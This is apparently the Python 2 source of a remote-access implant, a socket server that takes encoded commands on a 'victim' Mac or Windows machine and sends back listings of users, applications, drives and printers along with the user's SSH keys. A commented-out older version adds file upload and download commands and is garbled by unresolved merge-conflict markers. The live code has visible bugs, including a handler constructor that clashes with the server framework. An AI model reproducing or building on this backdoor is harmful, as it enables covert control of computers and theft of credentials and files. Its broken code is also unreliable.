import os
import platform
import SocketServer
import sys

from os_types.macintosh import Mac
from os_types.windows import Windows
    
class ImplantHandler(SocketServer.BaseRequestHandler):
    def __init__(self, ip, port, cipher):
        self.ip = ip
        self.port = port
        self.cipher = cipher
        #self.logger = logging.getLogger('ImplantHandler')
        
    def handle(self):
        from .constants import BUFFER_SIZE
        print "here1"
        if platform.system() == 'Darwin':
            victim = Mac()
        elif platform.system() == 'Windows': #if sys.platform.lower().startswith("win"):
            victim = Windows()
        else:
            self.request.sendall("Unknown OS: " + platform.system + ". Please proceed with caution.")

        while True:
            print "here2"
            try:
                cmd = self.cipher.decode(self.request.recv(BUFFER_SIZE)).strip()

                if cmd == "enum_os":
                    self.request.sendall(self.cipher.encode(victim.enum_os()))
                elif cmd == "enum_users":
                    self.request.sendall(self.cipher.encode(victim.enum_users()))
                elif cmd == "enum_applications":
                    self.request.sendall(self.cipher.encode(victim.enum_applications()))
                elif cmd == "enum_drives":
                    self.request.sendall(self.cipher.encode(victim.enum_drives()))
                elif cmd == "enum_printers":
                    self.request.sendall(self.cipher.encode(victim.enum_printers()))
                elif cmd == "get_ssh_keys":
                    self.request.sendall(self.cipher.encode(victim.get_ssh_keys()))
                else:
                    self.request.sendall(self.cipher.encode("unknown command\n"))
            except Exception as e: 
                print 'Uh no!', e
                self.server.close_request(self.request)
                sys.exit(1)                          

    def run(self):
        try:
            SocketServer.TCPServer.allow_reuse_address = True
            server = SocketServer.TCPServer((self.ip, self.port), ImplantHandler)
            print "[+] Implant active...Terminate w/ Ctrl-C\n"
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()
        except Exception as e:
            print "[!] Implant run() --> {0}".format(e)
        finally:
            server.shutdown()

# import os
# import platform
# import SocketServer
# import sys
# 
# from .os_types.macintosh import Mac
# from .os_types.windows import Windows
# from .encoders.mime import Mime
# 
# cipher = Mime()
#     
# class ImplantHandler(SocketServer.BaseRequestHandler):
#     from .constants import *
#     
#     def handle(self):
#         if platform.system() == 'Darwin':
#             victim = Mac()
#         elif platform.system() == 'Windows':
#             victim = Windows()
#         else:
#             self.request.sendall("Unknown OS: " + platform.system + ". Please proceed with caution.")
# 
#         while True:
#             try:
#                 cmd = cipher.decode(self.request.recv(BUFFER_SIZE)).strip()
#                 
#                 if cmd == "enum_os":
#                     self.request.sendall(cipher.encode(victim.enum_os()))
#                 elif cmd == "enum_users":
#                     self.request.sendall(cipher.encode(victim.enum_users()))
#                 elif cmd == "enum_applications":
#                     self.request.sendall(cipher.encode(victim.enum_applications()))
#                 elif cmd == "enum_drives":
#                     self.request.sendall(cipher.encode(victim.enum_drives()))
#                 elif cmd == "enum_printers":
#                     self.request.sendall(cipher.encode(victim.enum_printers()))
#                 elif cmd == "get_ssh_keys":
#                     self.request.sendall(cipher.encode(victim.get_ssh_keys()))
#                 elif cmd.startswith('upload') == True:
#                     saveMeFile = cmd[7:].split(' ')[1]
#                     
#                     if os.path.isfile(saveMeFile):
#                         break 
#                     else:   
#                         try:
# <<<<<<< Updated upstream
#                             with open(saveMeFile, 'wb') as f:
#                                 receiving = True
#                                 while receiving:
#                                     data = self.request.recv(BUFFER_SIZE)
#                                     if "EOF!EOF!" in data:
#                                         data = data[:-8]
#                                         receiving = False
#                                     data = cipher.decode(data)
#                                      
#                                     if not data:
#                                         break
#                                     elif  "EOF!EOF!" in data: 
#                                         f.write(data[:-8])
#                                         receiving = False
#                                     else:
#                                         f.write(data)
# =======
#                             f = open(saveMeFile, 'wb')
#                             while True:
#                                 data = cipher.decode(self.request.recv(BUFFER_SIZE))
#                                  
#                                 if not data:
#                                     break
#                                 else:
#                                     f.write(data)
#                             f.close()
# >>>>>>> Stashed changes
#                         except: 
#                             pass     
#                 elif cmd.startswith('download') == True:
#                     sendMeFile = cmd[9:].split(' ')[0]
# <<<<<<< Updated upstream
#                     
#                     with open(sendMeFile, 'rb') as f:
#                         while True:
#                             data = f.read(BUFFER_SIZE)
# 
#                             if not data:
#                                 break
#                             else:
#                                 self.request.sendall(cipher.encode(data)) 
#                     self.request.sendall("EOF!EOF!") 
#                 else:
#                     self.request.sendall(cipher.encode("unknown command\n"))
#             except Exception as e: 
#                 print 'Uh no!', e
#                 self.server.close_request(self.request)
#                 sys.exit(1)
#             except: 
#                 server.close_request(self.request) #remove this?
#                 sys.exit(1)                            
#         
# if __name__ == "__main__":
#     HOST, PORT = "localhost", 8080
#     cipher = Mime()
# 
# def spawn(HOST="localhost", PORT=8080):
#     server = None
#     try:
#         SocketServer.TCPServer.allow_reuse_address = True
#         server = SocketServer.TCPServer((HOST, PORT), ImplantHandler)
#         print "[+] Implant active...Terminate w/ Ctrl-C\n"
#         server.serve_forever()
#     except KeyboardInterrupt:
#         server.shutdown()
#     except Exception as e:
#         print "[!] Couldn't start server {0}".format(e)
#     finally:
#         if server == None:
#             print 'Could not bind to socket'
#         else:
#             print 'Shutting down server'
#             server.shutdown()